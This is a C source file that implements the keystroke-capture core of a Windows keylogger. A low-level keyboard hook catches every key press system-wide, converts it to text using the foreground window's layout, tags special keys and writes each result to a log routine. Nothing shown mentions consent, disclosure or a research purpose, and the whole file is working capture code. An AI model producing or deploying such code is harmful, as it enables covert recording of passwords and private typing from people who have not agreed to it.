#include "common.h"

HKL foreground_update_and_layout(void);
void logger_write_raw(const wchar_t* s);

static const wchar_t* named_key(DWORD vk)
{
    switch (vk) {
        case VK_RETURN:   return L"\\n";
        case VK_TAB:      return L"\\t";
        case VK_BACK:     return L"[BS]";
        case VK_ESCAPE:   return L"[ESC]";
        case VK_SHIFT:   case VK_LSHIFT:   case VK_RSHIFT:   return L"Shift";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return L"Ctrl";
        case VK_MENU:    case VK_LMENU:    case VK_RMENU:    return L"Alt";
        case VK_LWIN:    case VK_RWIN:     return L"Win";
        case VK_CAPITAL:  return L"[CAPS]";
        case VK_SPACE:    return L" ";
        case VK_LEFT:     return L"[LEFT]";
        case VK_RIGHT:    return L"[RIGHT]";
        case VK_UP:       return L"[UP]";
        case VK_DOWN:     return L"[DOWN]";
        case VK_DELETE:   return L"[DEL]";
        case VK_HOME:     return L"[HOME]";
        case VK_END:      return L"[END]";
        case VK_PRIOR:    return L"[PGUP]";
        case VK_NEXT:     return L"[PGDN]";
        case VK_INSERT:   return L"[INS]";
        case VK_PRINT:    return L"[PRINT]";
        case VK_F1:       return L"[F1]";
        case VK_F2:       return L"[F2]";
        case VK_F3:       return L"[F3]";
        case VK_F4:       return L"[F4]";
        case VK_F5:       return L"[F5]";
        case VK_F6:       return L"[F6]";
        case VK_F7:       return L"[F7]";
        case VK_F8:       return L"[F8]";
        case VK_F9:       return L"[F9]";
        case VK_F10:      return L"[F10]";
        case VK_F11:      return L"[F11]";
        case VK_F12:      return L"[F12]";
        default: return NULL;
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
		HKL layout = foreground_update_and_layout();

		const wchar_t *named = named_key(k->vkCode);

		if (named){
			logger_write_raw(named);
		}
		else {
			BYTE state[256] = { 0 };
			GetKeyboardState(state);
			wchar_t buf[8] = { 0 };

			int n = ToUnicodeEx(
				k->vkCode,
				k->scanCode,
				state,
				buf,
				8,
				0,
				layout
			);
			if (n> 0){
				buf[n] = 0;
				logger_write_raw(buf);
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}